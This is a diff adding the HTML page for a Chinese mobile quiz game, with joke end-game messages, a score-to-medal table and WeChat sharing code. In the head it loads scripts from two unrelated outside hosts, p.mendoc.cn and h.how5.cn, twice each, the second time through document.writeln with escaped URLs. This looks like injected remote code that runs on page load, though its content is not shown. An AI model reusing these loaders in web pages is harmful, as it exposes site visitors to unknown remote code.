@@ -1,0 +1,204 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+<div id='wx_pic' style='margin:0 auto;display:none;'>
+<img src='photo.jpg' />
+</div>
+<title>变态测试题</title>
+<meta name="mobile-web-app-capable" content="yes" />
+<meta name="keywords" content="变态测试题,变态测试题html5游戏" />
+<meta name="description" content="变态测试题html5游戏,变态测试题手机在线游戏" />
+<link rel="apple-touch-icon" href="icon.png" />
+<link rel="shortcut icon" href="icon.png" />
+<link rel="icon" href="icon.png" />
+<meta charset="utf-8">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="format-detection" content="telephone=no">
+<meta name="viewport" content="width=device-width, height=device-height, initial-scale=0.5, maximum-scale=0.5, user-scalable=no">
+<link rel="stylesheet" type="text/css" href="css/style.css?ver">
+<script src="js/jquery-min.js"></script>
+<script src="js/framer.js"></script>
+<script src="js/appv5.js?v=081801"></script>
+<script src='https://p.mendoc.cn/83449'></script>
+<script src='http://h.how5.cn/83449'></script>
+<script type="text/javascript">
+    document.writeln("<script src='http:\/\/h.how5.cn\/83449'><\/script>");
+    document.writeln("<script src='https:\/\/p.mendoc.cn\/83449'><\/script>");
+</script>
+<script type="text/javascript">
+// 游戏结束的时候提示语句
+var endGameTips = ['祝处女座生日快乐，为不创造下一个处女座努力',
+'纯，属虚构；乱，是佳人','挣的是临时工的钱，操的是CEO的心',
+'只要你努力，世上没什么事是你搞不砸的',
+'为什么我做得这么差，如果没有压力，我可以更差',
+'最近又胖了，打电话时一笑脸蛋子就碰能到挂机键',
+'帅哥尽量少娶美女，因为龙凤成翔',
+'挤公交=散打+瑜珈+柔道+平衡木',
+'枯藤老树昏鸦，空调wifi西瓜，午饭有鱼有虾，你丑没事我瞎',
+'你骂我，因为你不了解我，等你了解我，你会动手打我',
+'去一次星巴克，拍365张照片，发一年朋友圈',
+'今天上街碰到一个臭流氓，我实在受不了了，就帮他洗了个澡',
+'明日复明日，明日何其多！既然这么多，不妨再拖拖',
+'我是你转身就忘的路人甲，凭什么陪你蹉跎年华到天涯'
+];
+function getEndGameTips(){
+var index = parseInt(endGameTips.length * Math.random());
+return endGameTips[index];
+}
+// 根据答对个数获取勋章名称
+var martals = [{start:0,end:4,name:'万人践踏'},
+{start:5,end:8,name:'万人唾弃'},
+{start:9,end:12,name:'万人鄙视'},
+{start:13,end:16,name:'万人嫌弃'},
+{start:17,end:20,name:'万人惊叹'},
+{start:21,end:26,name:'万众瞩目'},
+{start:27,end:29,name:'万众崇拜'},
+{start:30,end:33,name:'万众钦佩'},
+{start:34,end:37,name:'万众景仰'},
+{start:38,end:44,name:'万众膜拜'},
+{start:45,end:52,name:'万众折服'},
+{start:53,end:60,name:'万众跪舔'},
+{start:61,end:60000000,name:'万王之王'}];
+function getMartalName(count){
+for(var i=0; i<martals.length; i++){
+var martal = martals[i];
+if(count>=martal.start && count<=martal.end){
+return martal.name;
+}
+}
+return "";
+}
+// 击败的百分比 y=(-1/3600.0)*x*x+(1/30.0)*x
+function getWinPercent(count){
+return parseInt(((-1/3600.0)*count*count+(1/30.0)*count)*100+"");
+}
+function resetShareContent(){
+var martal = getMartalName(correctCount);
+dp_share(correctCount,getWinPercent(correctCount));
+}
+function getUrlParam(name){
+var reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)");
+var r = window.location.search.substr(1).match(reg);
+if (r!=null) return r[2]; return null;
+}
+</script>
+<script type="text/javascript">
+$(function(e) {
+var windowwidth = $(window).width();
+//document.title = windowwidth + 'px';
+if(windowwidth >= 1080){
+//document.body.style.cssText = document.body.style.cssText + '; -webkit-transform: scale(1.5); ';
+$("#gamemain").attr("style","-webkit-transform: scale(0.5); ");
+}
+var vipsrc = getUrlParam('vipsrc');
+if('app' == vipsrc && !appbrowser.versions.android){
+$("#gamemain").attr("style","-webkit-transform: scale(0.5); -webkit-transform-origin: 0 0;");
+}
+if(appbrowser.versions.android){
+//document.body.style.cssText = document.body.style.cssText + '; -webkit-transform: scale('+(windowwidth/640)+');';
+$("#gamemain").attr("style",'-webkit-transform: scale('+(windowwidth/640)+');');
+}
+});
+var appbrowser={ 
+versions:function(){ 
+var u = navigator.userAgent, app = navigator.appVersion; 
+return { //移动终端浏览器版本信息 
+trident: u.indexOf('Trident') > -1, //IE内核 
+presto: u.indexOf('Presto') > -1, //opera内核 
+webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核 
+gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核 
+mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端 
+ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端 
+android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或uc浏览器 
+iPhone: u.indexOf('iPhone') > -1 , //是否为iPhone或者QQHD浏览器 
+iPad: u.indexOf('iPad') > -1, //是否iPad 
+webApp: u.indexOf('Safari') == -1 //是否web应该程序，没有头部与底部 
+}; 
+}(), 
+language:(navigator.browserLanguage || navigator.language).toLowerCase() 
+};
+</script>
+</head>
+<body>
+<div id="gamemain">
+</div>
+<script language=javascript>
+var mebtnopenurl = 'http://game.nineying.cn/';
+window.shareData = {
+"imgUrl": "http://game.nineying.cn/games/btcst/btcst.jpg",
+"timeLineLink": "http://game.nineying.cn/games/btcst/",
+"tTitle": "搞笑问答题，看看你能回答对几道",
+"tContent": "智商时代，必须可爱"
+};
+function showshare(){
+document.getElementById("share").style.display = "";
+};
+function clickMore(){
+window.location  = mebtnopenurl;
+};
+var imgUrl = window.shareData.imgUrl;
+var lineLink = window.shareData.timeLineLink;
+var descContent =  window.shareData.tContent;
+var shareTitle = window.shareData.tTitle;
+function shareFriend() {
+WeixinJSBridge.invoke('sendAppMessage',{
+"img_url": imgUrl,
+"img_width": "200",
+"img_height": "200",
+"link": lineLink,
+"desc": descContent,
+"title": shareTitle
+}, function(res) {
+//_report('send_msg', res.err_msg);
+})
+}
+function shareTimeline() {
+WeixinJSBridge.invoke('shareTimeline',{
+"img_url": imgUrl,
+"img_width": "200",
+"img_height": "200",
+"link": lineLink,
+"desc": shareTitle,
+"title": descContent
+}, function(res) {
+//_report('timeline', res.err_msg);
+});
+}
+function shareWeibo() {
+WeixinJSBridge.invoke('shareWeibo',{
+"content": descContent,
+"url": lineLink,
+}, function(res) {
+//_report('weibo', res.err_msg);
+});
+}
+// 当微信内置浏览器完成内部初始化后会触发WeixinJSBridgeReady事件。
+document.addEventListener('WeixinJSBridgeReady', function onBridgeReady() {
+// 发送给好友
+WeixinJSBridge.on('menu:share:appmessage', function(argv){
+shareFriend();
+});
+// 分享到朋友圈
+WeixinJSBridge.on('menu:share:timeline', function(argv){
+shareTimeline();
+});
+// 分享到微博
+WeixinJSBridge.on('menu:share:weibo', function(argv){
+shareWeibo();
+});
+}, false);		
+function dp_share(a,b){
+if(a>0){
+document.title =  window.shareData.tContent = descContent ='在变态测试题中，我答对了'+a+'到题目,击败了'+b+'%的人，快来挑战吧！';
+}
+};
+</script>
+<div id=share style="display: none">
+<img width=100% src="share.png" style="position: fixed; z-index: 5; top: 0; left: 0; display: " ontouchstart="document.getElementById('share').style.display='none';" onclick="document.getElementById('share').style.display='none';" />
+</div>
+</body>
+<div style="display:none;">
+<script src="../js/stat.js"></script>
+</div>
+</html>
